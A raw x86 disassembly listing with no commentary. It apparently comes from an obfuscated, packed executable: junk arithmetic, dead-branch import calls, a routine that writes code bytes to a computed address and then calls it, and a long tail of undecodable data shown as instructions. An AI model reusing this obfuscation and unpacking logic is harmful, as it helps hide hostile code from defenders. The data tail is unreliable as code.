  40b2ee:	or     DWORD PTR ds:0x42600c,0x5f7e
  40b2f8:	mov    edx,DWORD PTR ds:0x41d46c
  40b2fe:	or     DWORD PTR ds:0x428000,0x427018
  40b308:	mov    edx,DWORD PTR [edx+0x1c0]
  40b30e:	mov    edx,DWORD PTR [edx]
  40b310:	or     DWORD PTR ds:0x425014,0x42801c
  40b31a:	xor    esi,esi
  40b31c:	adc    DWORD PTR ds:0x425010,0x7665
  40b326:	add    edx,ecx
  40b328:	adc    esi,0xffffffff
  40b32b:	xor    edx,eax
  40b32d:	xor    esi,0x0
  40b330:	cmp    edx,0x70941fd1
  40b336:	jne    0x40b3af
  40b33c:	cmp    esi,0xffffffff
  40b33f:	jne    0x40b3af
  40b345:	mov    edx,DWORD PTR ds:0x41d4f0
  40b34b:	mov    esi,DWORD PTR ds:0x41d4e8
  40b351:	xor    edx,esi
  40b353:	mov    DWORD PTR ds:0x41d4e8,edx
  40b359:	mov    edx,DWORD PTR [ebp+0xc]
  40b35c:	mov    edx,DWORD PTR [edx]
  40b35e:	mov    edx,DWORD PTR [edx]
  40b360:	mov    esi,DWORD PTR ds:0x41d4e8
  40b366:	add    DWORD PTR [edx],esi
  40b368:	mov    esi,DWORD PTR [ebp+0x8]
  40b36b:	mov    edx,DWORD PTR ds:0x41d4e8
  40b371:	xor    esi,0x7510893
  40b377:	add    esi,0x3272db
  40b37d:	xor    ebx,ebx
  40b37f:	add    esi,ecx
  40b381:	adc    ebx,0xffffffff
  40b384:	xor    edi,edi
  40b386:	xor    esi,eax
  40b388:	xor    ebx,0x0
  40b38b:	add    edx,ecx
  40b38d:	adc    edi,0xffffffff
  40b390:	xor    edx,eax
  40b392:	xor    edi,0x0
  40b395:	cmp    edx,esi
  40b397:	jne    0x40b3af
  40b39d:	cmp    edi,ebx
  40b39f:	jne    0x40b3af
  40b3a5:	mov    eax,ds:0x41d4e8
  40b3aa:	mov    ds:0x41d4f0,eax
  40b3af:	pop    edi
  40b3b0:	pop    esi
  40b3b1:	pop    ebx
  40b3b2:	pop    ebp
  40b3b3:	ret    0x8
  40b3b6:	push   ebp
  40b3b7:	mov    ebp,esp
  40b3b9:	sub    esp,0x90
  40b3bf:	and    DWORD PTR ds:0x428004,0x0
  40b3c9:	jmp    0x40b3db
  40b3ce:	mov    ecx,DWORD PTR ds:0x428004
  40b3d4:	inc    ecx
  40b3d5:	mov    DWORD PTR ds:0x428004,ecx
  40b3db:	cmp    DWORD PTR ds:0x428004,0x14
  40b3e2:	jae    0x40b417
  40b3e8:	cmp    DWORD PTR ds:0x428004,0x20
  40b3ef:	jne    0x40b405
  40b3f5:	push   0x41ff71
  40b3fa:	push   0x41ff5b
  40b3ff:	call   DWORD PTR ds:0x421050
  40b405:	jmp    0x40b3ce
  40b40a:	movzx  ecx,BYTE PTR ds:0x42801c
  40b411:	sub    DWORD PTR ds:0x425014,ecx
  40b417:	push   esi
  40b418:	or     ecx,eax
  40b41a:	push   edi
  40b41b:	and    DWORD PTR ds:0x428004,0x0
  40b425:	jmp    0x40b435
  40b42a:	mov    eax,ds:0x428004
  40b42f:	inc    eax
  40b430:	mov    ds:0x428004,eax
  40b435:	cmp    DWORD PTR ds:0x428004,0x10
  40b43c:	jae    0x40b460
  40b442:	cmp    DWORD PTR ds:0x428004,0x1f
  40b449:	jne    0x40b45b
  40b44f:	push   DWORD PTR [ebp-0x20]
  40b452:	push   DWORD PTR [ebp-0x14]
  40b455:	call   DWORD PTR ds:0x421054
  40b45b:	jmp    0x40b42a
  40b460:	mov    eax,ds:0x41d46c
  40b465:	and    ecx,0x5378
  40b46b:	mov    DWORD PTR [ebp-0x2c],eax
  40b46e:	sub    esi,DWORD PTR ds:0x425018
  40b474:	mov    eax,ds:0x41d578
  40b479:	mov    DWORD PTR [ebp-0x3c],eax
  40b47c:	and    DWORD PTR [ebp-0x34],0x0
  40b480:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  40b487:	add    DWORD PTR ds:0x42600c,0x3783
  40b491:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40b498:	and    DWORD PTR ds:0x42901c,0x4e39
  40b4a2:	mov    eax,DWORD PTR [ebp-0x1c]
  40b4a5:	xor    DWORD PTR ds:0x42800c,0x4866
  40b4af:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b4b2:	sub    esi,DWORD PTR ds:0x427008
  40b4b8:	xor    eax,ecx
  40b4ba:	mov    ecx,DWORD PTR ds:0x41d28c
  40b4c0:	mov    esi,DWORD PTR ds:0x41d2a8
  40b4c6:	sub    ecx,esi
  40b4c8:	sub    ecx,DWORD PTR [ecx+esi*1]
  40b4cb:	mov    DWORD PTR [ebp-0x1c],eax
  40b4ce:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  40b4d5:	add    DWORD PTR ds:0x426008,ecx
  40b4db:	mov    eax,DWORD PTR [ebp-0x28]
  40b4de:	xor    DWORD PTR ds:0x428018,ebx
  40b4e4:	mov    ecx,DWORD PTR [ebp-0x28]
  40b4e7:	or     esi,edi
  40b4e9:	xor    eax,ecx
  40b4eb:	mov    DWORD PTR [ebp-0x28],eax
  40b4ee:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  40b4f5:	sub    ecx,0x68bb
  40b4fb:	mov    eax,DWORD PTR [ebp-0x18]
  40b4fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40b501:	xor    eax,ecx
  40b503:	adc    ecx,esi
  40b505:	mov    DWORD PTR [ebp-0x18],eax
  40b508:	not    DWORD PTR ds:0x428008
  40b50e:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  40b515:	mov    ecx,DWORD PTR ds:0x41ffff
  40b51b:	mov    esi,DWORD PTR ds:0x41d2a4
  40b521:	sub    esi,ecx
  40b523:	and    ecx,DWORD PTR [ecx+esi*1]
  40b526:	mov    eax,DWORD PTR [ebp-0x24]
  40b529:	mov    ecx,DWORD PTR [ebp-0x24]
  40b52c:	xor    eax,ecx
  40b52e:	and    edi,0x1f5e
  40b534:	mov    DWORD PTR [ebp-0x24],eax
  40b537:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  40b53e:	mov    eax,DWORD PTR [ebp-0x14]
  40b541:	mov    ecx,DWORD PTR [ebp-0x14]
  40b544:	xor    eax,ecx
  40b546:	and    DWORD PTR ds:0x428018,0x1b89
  40b550:	mov    DWORD PTR [ebp-0x14],eax
  40b553:	mov    edi,DWORD PTR ds:0x41ffe7
  40b559:	mov    ecx,DWORD PTR ds:0x41d270
  40b55f:	sub    edi,ecx
  40b561:	xor    edi,DWORD PTR [edi+ecx*1]
  40b564:	mov    eax,DWORD PTR [ebp-0x20]
  40b567:	mov    DWORD PTR ds:0x427010,0x1f
  40b571:	cmp    DWORD PTR ds:0x427010,0x0
  40b578:	je     0x40b5ad
  40b57e:	cmp    DWORD PTR ds:0x427010,0x2f
  40b585:	jne    0x40b59b
  40b58b:	push   0x425000
  40b590:	push   0x673f
  40b595:	call   DWORD PTR ds:0x421058
  40b59b:	mov    edi,DWORD PTR ds:0x427010
  40b5a1:	dec    edi
  40b5a2:	mov    DWORD PTR ds:0x427010,edi
  40b5a8:	jmp    0x40b571
  40b5ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40b5b0:	mov    esi,0x7510893
  40b5b5:	neg    DWORD PTR ds:0x42900c
  40b5bb:	xor    eax,esi
  40b5bd:	mov    edi,0x3272db
  40b5c2:	add    eax,edi
  40b5c4:	xor    eax,ecx
  40b5c6:	mov    DWORD PTR [ebp-0x14],eax
  40b5c9:	sbb    DWORD PTR ds:0x426010,0x1ce0
  40b5d3:	mov    eax,DWORD PTR [ebp-0x10]
  40b5d6:	xor    ecx,DWORD PTR ds:0x42800c
  40b5dc:	mov    ecx,DWORD PTR [ebp-0x10]
  40b5df:	sub    eax,ecx
  40b5e1:	and    ecx,DWORD PTR ds:0x427018
  40b5e7:	mov    DWORD PTR [ebp-0x10],eax
  40b5ea:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  40b5f1:	xor    ecx,DWORD PTR ds:0x42500c
  40b5f7:	mov    al,BYTE PTR [ebp-0x1]
  40b5fa:	add    DWORD PTR ds:0x425018,ecx
  40b600:	movzx  ecx,BYTE PTR [ebp-0x1]
  40b604:	movzx  eax,al
  40b607:	adc    DWORD PTR ds:0x42700c,0x429008
  40b611:	sub    ecx,eax
  40b613:	mov    BYTE PTR [ebp-0x1],cl
  40b616:	movzx  eax,BYTE PTR [ebp-0x1]
  40b61a:	xor    eax,0xffffff99
  40b61d:	mov    BYTE PTR [ebp-0x1],al
  40b620:	or     eax,DWORD PTR ds:0x42901c
  40b626:	mov    eax,DWORD PTR [ebp-0x20]
  40b629:	xor    eax,esi
  40b62b:	add    eax,edi
  40b62d:	and    DWORD PTR ds:0x429004,0xdaf
  40b637:	mov    DWORD PTR [ebp-0x14],eax
  40b63a:	and    DWORD PTR ds:0x428018,0x429014
  40b644:	lea    eax,[ebp-0x40]
  40b647:	adc    DWORD PTR ds:0x425024,0x42500c
  40b651:	mov    DWORD PTR [ebp-0x38],eax
  40b654:	adc    DWORD PTR ds:0x425020,0x75b6
  40b65e:	lea    eax,[ebp-0x38]
  40b661:	mov    DWORD PTR [ebp-0x44],eax
  40b664:	sbb    DWORD PTR ds:0x425010,0x425028
  40b66e:	lea    eax,[ebp-0x44]
  40b671:	mov    DWORD PTR [ebp-0x8],eax
  40b674:	or     DWORD PTR ds:0x427008,0x2eb5
  40b67e:	lea    eax,[ebp-0x8]
  40b681:	and    DWORD PTR ds:0x42801c,0x428004
  40b68b:	mov    DWORD PTR [ebp-0x48],eax
  40b68e:	adc    DWORD PTR ds:0x42700c,ebx
  40b694:	mov    eax,DWORD PTR [ebp-0x18]
  40b697:	sbb    DWORD PTR ds:0x425010,0x426010
  40b6a1:	xor    eax,esi
  40b6a3:	add    eax,edi
  40b6a5:	and    DWORD PTR ds:0x429014,0x19f0
  40b6af:	push   eax
  40b6b0:	mov    eax,DWORD PTR [ebp-0x1c]
  40b6b3:	xor    eax,esi
  40b6b5:	add    eax,edi
  40b6b7:	push   eax
  40b6b8:	mov    eax,DWORD PTR [ebp-0x10]
  40b6bb:	xor    eax,esi
  40b6bd:	add    eax,edi
  40b6bf:	push   eax
  40b6c0:	lea    eax,[ebp-0x90]
  40b6c6:	push   eax
  40b6c7:	push   DWORD PTR [ebp-0x20]
  40b6ca:	push   DWORD PTR [ebp-0x30]
  40b6cd:	call   0x408d97
  40b6d2:	test   eax,eax
  40b6d4:	je     0x40b705
  40b6da:	lea    eax,[ebp-0x90]
  40b6e0:	push   eax
  40b6e1:	mov    eax,DWORD PTR [ebp-0x30]
  40b6e4:	xor    eax,esi
  40b6e6:	add    eax,edi
  40b6e8:	push   eax
  40b6e9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6ec:	add    eax,0xaa
  40b6f1:	push   eax
  40b6f2:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6f5:	mov    eax,DWORD PTR [eax+0x198]
  40b6fb:	push   DWORD PTR [eax]
  40b6fd:	call   0x403f26
  40b702:	mov    DWORD PTR [ebp-0x40],eax
  40b705:	lea    eax,[ebp+0x4]
  40b708:	mov    DWORD PTR [ebp-0x34],eax
  40b70b:	mov    eax,DWORD PTR [ebp-0x8]
  40b70e:	mov    eax,DWORD PTR [eax]
  40b710:	mov    eax,DWORD PTR [eax]
  40b712:	mov    eax,DWORD PTR [eax]
  40b714:	test   eax,eax
  40b716:	je     0x40b797
  40b71c:	lea    eax,[ebp-0xc]
  40b71f:	mov    DWORD PTR [ebp-0x4c],eax
  40b722:	mov    eax,DWORD PTR [ebp-0x3c]
  40b725:	mov    DWORD PTR [ebp-0xc],eax
  40b728:	mov    eax,DWORD PTR [ebp-0x8]
  40b72b:	mov    eax,DWORD PTR [eax]
  40b72d:	mov    eax,DWORD PTR [eax]
  40b72f:	mov    eax,DWORD PTR [eax]
  40b731:	sub    DWORD PTR [ebp-0xc],eax
  40b734:	mov    ecx,DWORD PTR [ebp-0x10]
  40b737:	xor    ecx,esi
  40b739:	mov    eax,0xffcd8d25
  40b73e:	sub    eax,ecx
  40b740:	add    DWORD PTR [ebp-0xc],eax
  40b743:	mov    eax,DWORD PTR [ebp-0xc]
  40b746:	mov    ecx,DWORD PTR [ebp-0x8]
  40b749:	mov    ecx,DWORD PTR [ecx]
  40b74b:	mov    ecx,DWORD PTR [ecx]
  40b74d:	mov    ecx,DWORD PTR [ecx]
  40b74f:	mov    DWORD PTR [ecx+0x1],eax
  40b752:	mov    al,BYTE PTR [ebp-0x1]
  40b755:	mov    ecx,DWORD PTR [ebp-0x8]
  40b758:	mov    ecx,DWORD PTR [ecx]
  40b75a:	mov    ecx,DWORD PTR [ecx]
  40b75c:	mov    ecx,DWORD PTR [ecx]
  40b75e:	push   DWORD PTR [ebp-0x2c]
  40b761:	xor    al,0x6f
  40b763:	sub    al,0xd
  40b765:	mov    BYTE PTR [ecx],al
  40b767:	mov    eax,ds:0x41d2e8
  40b76c:	push   DWORD PTR [eax]
  40b76e:	push   DWORD PTR ds:0x41d544
  40b774:	push   DWORD PTR ds:0x41d2f0
  40b77a:	push   DWORD PTR ds:0x41d524
  40b780:	push   DWORD PTR ds:0x41d598
  40b786:	push   DWORD PTR [ebp-0x30]
  40b789:	push   DWORD PTR [ebp-0x20]
  40b78c:	mov    eax,DWORD PTR [ebp-0x8]
  40b78f:	mov    eax,DWORD PTR [eax]
  40b791:	mov    eax,DWORD PTR [eax]
  40b793:	mov    eax,DWORD PTR [eax]
  40b795:	call   eax
  40b797:	mov    eax,DWORD PTR [ebp-0x34]
  40b79a:	mov    ecx,DWORD PTR ds:0x41d4e8
  40b7a0:	add    DWORD PTR [eax],ecx
  40b7a2:	pop    edi
  40b7a3:	pop    esi
  40b7a4:	leave  
  40b7a5:	ret    
  40b7a6:	push   ebp
  40b7a7:	mov    ebp,esp
  40b7a9:	sub    esp,0x18
  40b7ac:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  40b7b3:	lea    eax,[ebp+0x14]
  40b7b6:	neg    edx
  40b7b8:	mov    DWORD PTR [ebp-0x4],eax
  40b7bb:	push   esi
  40b7bc:	sbb    DWORD PTR ds:0x426000,edi
  40b7c2:	mov    esi,0xf89c85b6
  40b7c7:	mov    DWORD PTR [ebp-0xc],esi
  40b7ca:	lea    eax,[ebp-0xc]
  40b7cd:	add    edx,ecx
  40b7cf:	mov    DWORD PTR [ebp-0x14],eax
  40b7d2:	sub    edx,ecx
  40b7d4:	mov    eax,DWORD PTR [ebp-0xc]
  40b7d7:	dec    ecx
  40b7d8:	mov    edx,DWORD PTR [ebp-0x14]
  40b7db:	and    ecx,0x3a88
  40b7e1:	mov    ecx,0x7510893
  40b7e6:	or     DWORD PTR ds:0x427010,0x426000
  40b7f0:	xor    eax,ecx
  40b7f2:	add    eax,0x3272db
  40b7f7:	sub    DWORD PTR ds:0x427010,0x427014
  40b801:	mov    DWORD PTR [edx],eax
  40b803:	xor    DWORD PTR ds:0x425000,0x422
  40b80d:	mov    eax,ds:0x41d2e4
  40b812:	mov    edx,DWORD PTR ds:0x41d270
  40b818:	mov    edx,DWORD PTR [edx]
  40b81a:	xor    DWORD PTR ds:0x426000,edx
  40b820:	mov    edx,DWORD PTR [ebp-0x4]
  40b823:	mov    eax,DWORD PTR [eax]
  40b825:	and    DWORD PTR ds:0x425008,0x4c84
  40b82f:	add    eax,DWORD PTR [edx]
  40b831:	mov    DWORD PTR ds:0x426004,0x10
  40b83b:	cmp    DWORD PTR ds:0x426004,0x0
  40b842:	je     0x40b874
  40b848:	cmp    DWORD PTR ds:0x426004,0x20
  40b84f:	jne    0x40b860
  40b855:	push   0x6cf7
  40b85a:	call   DWORD PTR ds:0x421014
  40b860:	xor    edx,edx
  40b862:	add    edx,DWORD PTR ds:0x426004
  40b868:	dec    edx
  40b869:	mov    DWORD PTR ds:0x426004,edx
  40b86f:	jmp    0x40b83b
  40b874:	push   edi
  40b875:	mov    DWORD PTR [ebp-0x8],eax
  40b878:	sub    edi,0x3a07
  40b87e:	mov    edi,DWORD PTR [ebp+0x8]
  40b881:	mov    DWORD PTR ds:0x429004,0x1a
  40b88b:	cmp    DWORD PTR ds:0x429004,0x0
  40b892:	je     0x40b8ca
  40b898:	cmp    DWORD PTR ds:0x429004,0x2a
  40b89f:	jne    0x40b8b8
  40b8a5:	push   0x42901c
  40b8aa:	push   0x429000
  40b8af:	push   DWORD PTR [ebp-0xc]
  40b8b2:	call   DWORD PTR ds:0x42105c
  40b8b8:	mov    edx,DWORD PTR ds:0x429004
  40b8be:	dec    edx
  40b8bf:	mov    DWORD PTR ds:0x429004,edx
  40b8c5:	jmp    0x40b88b
  40b8ca:	mov    eax,ds:0x41d46c
  40b8cf:	add    DWORD PTR ds:0x426018,0x7a9e
  40b8d9:	mov    eax,DWORD PTR [eax+0x198]
  40b8df:	and    DWORD PTR ds:0x428000,0x0
  40b8e9:	jmp    0x40b8fb
  40b8ee:	mov    edx,DWORD PTR ds:0x428000
  40b8f4:	inc    edx
  40b8f5:	mov    DWORD PTR ds:0x428000,edx
  40b8fb:	cmp    DWORD PTR ds:0x428000,0x16
  40b902:	jae    0x40b949
  40b908:	cmp    DWORD PTR ds:0x428000,0xa
  40b90f:	jne    0x40b920
  40b915:	push   0x6e10
  40b91a:	call   DWORD PTR ds:0x421018
  40b920:	cmp    DWORD PTR ds:0x428000,0x9
  40b927:	jne    0x40b93a
  40b92d:	mov    edx,DWORD PTR ds:0x428000
  40b933:	inc    edx
  40b934:	mov    DWORD PTR ds:0x428000,edx
  40b93a:	jmp    0x40b8ee
  40b93f:	adc    DWORD PTR ds:0x42800c,0x7489
  40b949:	xor    edi,ecx
  40b94b:	mov    edx,DWORD PTR ds:0x41d2bc
  40b951:	mov    edx,DWORD PTR [edx]
  40b953:	and    DWORD PTR ds:0x426010,edx
  40b959:	mov    edx,0x3272db
  40b95e:	add    edi,edx
  40b960:	mov    DWORD PTR ds:0x427014,0x73af
  40b96a:	cmp    DWORD PTR [eax],edi
  40b96c:	je     0x40b98d
  40b972:	mov    DWORD PTR ds:0x427018,0x6eb3
  40b97c:	mov    eax,DWORD PTR [eax]
  40b97e:	mov    DWORD PTR ds:0x429008,0x1439
  40b988:	jmp    0x410469
  40b98d:	mov    eax,0x67c2
  40b992:	mov    eax,DWORD PTR [ebp+0x18]
  40b995:	cmp    eax,esi
  40b997:	jne    0x40b9b1
  40b99d:	mov    DWORD PTR ds:0x427004,0x29bc
  40b9a7:	push   0xf89c85b5
  40b9ac:	jmp    0x410458
  40b9b1:	mov    esi,DWORD PTR [ebp+0x18]
  40b9b4:	not    DWORD PTR ds:0x42700c
  40b9ba:	mov    eax,0xf89c85b4
  40b9bf:	mov    DWORD PTR ds:0x427008,0x585a
  40b9c9:	cmp    esi,eax
  40b9cb:	mov    DWORD PTR ds:0x429004,0x6551
  40b9d5:	jne    0x410448
  40b9db:	or     eax,eax
  40b9dd:	mov    eax,DWORD PTR [ebp+0x10]
  40b9e0:	add    DWORD PTR ds:0x425020,edi
  40b9e6:	xor    eax,ecx
  40b9e8:	add    DWORD PTR ds:0x425020,0xdeb
  40b9f2:	add    eax,edx
  40b9f4:	mov    DWORD PTR ds:0x425004,0x1b
  40b9fe:	cmp    DWORD PTR ds:0x425004,0x0
  40ba05:	je     0x40ba5e
  40ba0b:	cmp    DWORD PTR ds:0x425004,0x2
  40ba12:	jne    0x40ba30
  40ba18:	push   0x7389
  40ba1d:	push   0x7d80
  40ba22:	push   DWORD PTR [ebp-0xc]
  40ba25:	push   0x7694
  40ba2a:	call   DWORD PTR ds:0x42101c
  40ba30:	cmp    DWORD PTR ds:0x425004,0x3
  40ba37:	jne    0x40ba4a
  40ba3d:	mov    esi,DWORD PTR ds:0x425004
  40ba43:	dec    esi
  40ba44:	mov    DWORD PTR ds:0x425004,esi
  40ba4a:	xor    esi,esi
  40ba4c:	add    esi,DWORD PTR ds:0x425004
  40ba52:	dec    esi
  40ba53:	mov    DWORD PTR ds:0x425004,esi
  40ba59:	jmp    0x40b9fe
  40ba5e:	mov    DWORD PTR [ebp-0x18],eax
  40ba61:	adc    eax,DWORD PTR ds:0x42801c
  40ba67:	mov    eax,DWORD PTR [ebp+0xc]
  40ba6a:	mov    esi,DWORD PTR [ebp-0x8]
  40ba6d:	or     DWORD PTR ds:0x42501c,0x426004
  40ba77:	xor    eax,ecx
  40ba79:	add    eax,edx
  40ba7b:	xor    DWORD PTR ds:0x429004,0x42601c
  40ba85:	imul   eax,DWORD PTR [esi]
  40ba88:	mov    esi,DWORD PTR [ebp+0x8]
  40ba8b:	sbb    DWORD PTR ds:0x427014,0x428018
  40ba95:	xor    esi,ecx
  40ba97:	add    DWORD PTR ds:0x429014,0x42500c
  40baa1:	add    esi,edx
  40baa3:	cmp    esi,eax
  40baa5:	jmp    0x40de50
  40baaa:	jl     0x40baa1
  40baac:	retf   0xc78f
  40baaf:	mov    esi,DWORD PTR [ebx]
  40bab1:	test   edi,edi
  40bab3:	rcl    ch,cl
  40bab5:	jmp    0xf573:0x3eb49fca
  40babc:	bound  esp,QWORD PTR [edx-0xc]
  40babf:	pop    edi
  40bac0:	bound  esp,QWORD PTR [edx-0x15]
  40bac3:	pop    edi
  40bac4:	ss pop ebx
  40bac6:	fwait
  40bac7:	test   BYTE PTR [ebp+0x311662b5],al
  40bacd:	xor    BYTE PTR [eax-0x3d],dh
  40bad0:	or     DWORD PTR [eax+ecx*2+0x32],edi
  40bad4:	cwde   
  40bad5:	fs add al,0xb
  40bad8:	xchg   ebp,eax
  40bad9:	jle    0x40ba87
  40badb:	jne    0x40baf7
  40badd:	out    dx,al
  40bade:	outs   dx,BYTE PTR ds:[esi]
  40badf:	mov    ds:0x71402f51,al
  40bae4:	aam    0xd
  40bae6:	pop    edi
  40bae7:	fdiv   st(5),st
  40bae9:	xchg   edx,eax
  40baea:	xor    al,BYTE PTR [edx-0x60]
  40baed:	lock or eax,0xc153fd6e
  40baf3:	lds    edx,FWORD PTR [esi-0x10]
  40baf6:	dec    esp
  40baf7:	jae    0x40bab8
  40baf9:	inc    esp
  40bafa:	mov    dl,0x12
  40bafc:	add    cl,ch
  40bafe:	xchg   ebx,eax
  40baff:	and    edi,DWORD PTR [ebx+eax*2]
  40bb02:	jno    0x40bb23
  40bb04:	call   0x18ad:0xe354c490
  40bb0b:	test   DWORD PTR [edi+0x7f562a7b],0x367d0233
  40bb15:	icebp  
  40bb16:	dec    esp
  40bb17:	jae    0x40bb39
  40bb19:	mov    cs,ebx
  40bb1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb1c:	sub    eax,0xe7f3bd5e
  40bb21:	xchg   ebx,eax
  40bb22:	sub    cl,bh
  40bb24:	or     al,0x4e
  40bb26:	dec    ebx
  40bb27:	lahf   
  40bb28:	lods   eax,DWORD PTR ds:[esi]
  40bb29:	pop    es
  40bb2a:	mov    WORD PTR [ebx-0x62],ss
  40bb2d:	es jne 0x40bb31
  40bb30:	std    
  40bb31:	fpatan 
  40bb33:	dec    eax
  40bb34:	das    
  40bb35:	aad    0x91
  40bb37:	test   esi,0x851e686f
  40bb3d:	sub    bl,BYTE PTR [edx+edx*1-0x4127cf57]
  40bb44:	push   0xba38ae8d
  40bb49:	outs   dx,BYTE PTR ds:[esi]
  40bb4a:	mov    ecx,0x632b71cb
  40bb4f:	call   0xe45d9150
  40bb54:	aas    
  40bb55:	or     ebp,DWORD PTR ds:0x66059426
  40bb5b:	and    DWORD PTR [edx+0x78d4b59f],0x41
  40bb62:	cmp    al,0x91
  40bb64:	mov    fs,WORD PTR [esi-0x62]
  40bb67:	pop    eax
  40bb68:	inc    ebp
  40bb69:	push   es
  40bb6a:	(bad)  
  40bb6b:	in     al,dx
  40bb6c:	pop    ebp
  40bb6d:	or     DWORD PTR [ebp-0x24],edi
  40bb70:	jge    0x40bb7a
  40bb72:	aad    0xd6
  40bb74:	adc    dl,dh
  40bb76:	mov    fs,edx
  40bb78:	lods   al,BYTE PTR ds:[esi]
  40bb79:	dec    edx
  40bb7a:	repz xlat BYTE PTR cs:[ebx]
  40bb7d:	(bad)  
  40bb7e:	dec    edi
  40bb7f:	cmp    edx,DWORD PTR [eax]
  40bb81:	adc    al,0x47
  40bb83:	mov    dl,0xc5
  40bb85:	xor    ebx,edx
  40bb87:	iret   
  40bb88:	mov    bl,0xa6
  40bb8a:	rcr    edx,0x37
  40bb8d:	push   edi
  40bb8e:	jge    0x40bbcd
  40bb90:	test   DWORD PTR [esp+ecx*2+0x54ddb49c],esi
  40bb97:	adc    eax,0xc6b445ca
  40bb9c:	xor    BYTE PTR [edx-0x76],bl
  40bb9f:	das    
  40bba0:	and    BYTE PTR [ecx-0x4db71efc],bl
  40bba6:	dec    edx
  40bba7:	imul   eax,DWORD PTR [esi],0xea99dc72
  40bbad:	pop    ebx
  40bbae:	mov    ds:0x5524346c,al
  40bbb3:	dec    ecx
  40bbb4:	int    0x9b
  40bbb6:	loop   0x40bbde
  40bbb8:	sub    dl,bl
  40bbba:	ins    BYTE PTR es:[edi],dx
  40bbbb:	les    ecx,FWORD PTR [ebp-0x42b3a745]
  40bbc1:	pop    ecx
  40bbc2:	ja     0x40bc03
  40bbc4:	jmp    0x40bbed
  40bbc6:	adc    ch,cl
  40bbc8:	sbb    al,0xa1
  40bbca:	dec    ebx
  40bbcb:	add    DWORD PTR ds:0x5204812b,eax
  40bbd1:	ds cld 
  40bbd3:	or     ch,BYTE PTR [esp+esi*4-0x28292cc0]
  40bbda:	xor    cl,BYTE PTR [esi+0x7a]
  40bbdd:	mov    eax,0xca583b21
  40bbe2:	loope  0x40bb7e
  40bbe4:	arpl   WORD PTR [esi],di
  40bbe6:	fwait
  40bbe7:	and    eax,0x4c7ab32d
  40bbec:	icebp  
  40bbed:	or     DWORD PTR [edx+0x37468e1],ecx
  40bbf3:	mov    ?,WORD PTR [ebp-0x66e5c7fc]
  40bbf9:	adc    al,0x6
  40bbfb:	(bad)  
  40bbfc:	push   eax
  40bbfd:	mov    dh,0xea
  40bbff:	int3   
  40bc00:	les    eax,FWORD PTR [edi]
  40bc02:	es jo  0x40bc09
  40bc05:	addr16 ja 0x40bbc8
  40bc08:	pop    ebx
  40bc09:	pop    es
  40bc0a:	rol    DWORD PTR [eax-0x29],0x80
  40bc0e:	pop    edx
  40bc0f:	or     eax,0xea97cd3
  40bc14:	xchg   ecx,eax
  40bc15:	cmp    ch,BYTE PTR [eax]
  40bc17:	add    DWORD PTR [eax],0xffffffa6
  40bc1a:	test   dh,al
  40bc1c:	(bad)  
  40bc1d:	mov    dh,0x86
  40bc1f:	je     0x40bbc3
  40bc21:	call   0x8e8979b1
  40bc26:	mov    eax,ds:0xc5a36297
  40bc2b:	test   DWORD PTR [eax-0x74737565],0xf2dbc9a8
  40bc35:	dec    ecx
  40bc36:	pop    edi
  40bc37:	mov    ebx,0x3c523c87
  40bc3c:	(bad)  
  40bc3d:	inc    edi
  40bc3e:	icebp  
  40bc3f:	aas    
  40bc40:	jge    0x40bbd6
  40bc42:	inc    ecx
  40bc43:	or     esp,DWORD PTR [edi+0x6c0e87c0]
  40bc49:	and    BYTE PTR [eax],ch
  40bc4b:	or     eax,0xffffffd9
  40bc4e:	jno    0x40bc46
  40bc50:	adc    ch,BYTE PTR fs:[eax]
  40bc53:	pop    edx
  40bc54:	and    ecx,eax
  40bc56:	fidivr DWORD PTR [eax+eiz*4+0x24]
  40bc5a:	fisub  WORD PTR ds:0x3b21a4e0
  40bc60:	enter  0x6a55,0xa8
  40bc64:	xor    al,0xc
  40bc66:	fild   QWORD PTR [ebx+0x2d]
  40bc69:	in     al,dx
  40bc6a:	shl    DWORD PTR ds:0x7b7d7b7e,1
  40bc70:	push   esi
  40bc71:	sub    BYTE PTR [eax+0x41],dl
  40bc74:	scas   eax,DWORD PTR es:[edi]
  40bc75:	cmp    al,BYTE PTR [ebx+0x2a2d2e49]
  40bc7b:	retf   
  40bc7c:	ins    BYTE PTR es:[edi],dx
  40bc7d:	xchg   esp,eax
  40bc7e:	shr    bl,0x42
  40bc81:	sahf   
  40bc82:	shl    DWORD PTR [esi],cl
  40bc84:	xchg   ebx,eax
  40bc85:	hlt    
  40bc86:	mov    ebp,0xbb46d9a5
  40bc8b:	test   BYTE PTR [ebx+0x184913cd],bh
  40bc91:	outs   dx,DWORD PTR ds:[esi]
  40bc92:	repz jae 0x40bcec
  40bc95:	adc    DWORD PTR [ebx+0x56378a5d],0x28
  40bc9c:	das    
  40bc9d:	and    DWORD PTR [edx+0x52f642ce],0x4c
  40bca4:	les    edi,FWORD PTR [edx+0x3f77a02d]
  40bcaa:	sub    al,BYTE PTR [edx-0x5a]
  40bcad:	push   edi
  40bcae:	jb     0x40bcfa
  40bcb0:	fs xchg esp,eax
  40bcb2:	outs   dx,BYTE PTR ds:[esi]
  40bcb3:	daa    
  40bcb4:	push   es
  40bcb5:	mov    gs:0x1ed22b4e,eax
  40bcbb:	or     dl,BYTE PTR [edx+edi*8+0x659a615c]
  40bcc2:	outs   dx,BYTE PTR ds:[esi]
  40bcc3:	outs   dx,DWORD PTR ds:[esi]
  40bcc4:	jae    0x40bcc2
  40bcc6:	mov    ah,0x5f
  40bcc8:	adc    DWORD PTR [esi-0x467b3353],esi
  40bcce:	fisttp WORD PTR [edi]
  40bcd0:	sar    BYTE PTR [eax],cl
  40bcd2:	push   ecx
  40bcd3:	sub    eax,0x166d6ab6
  40bcd8:	ror    dl,0x68
  40bcdb:	mov    cl,0x69
  40bcdd:	jne    0x40bc84
  40bcdf:	aas    
  40bce0:	and    esi,DWORD PTR [ebp-0x6e]
  40bce3:	inc    edi
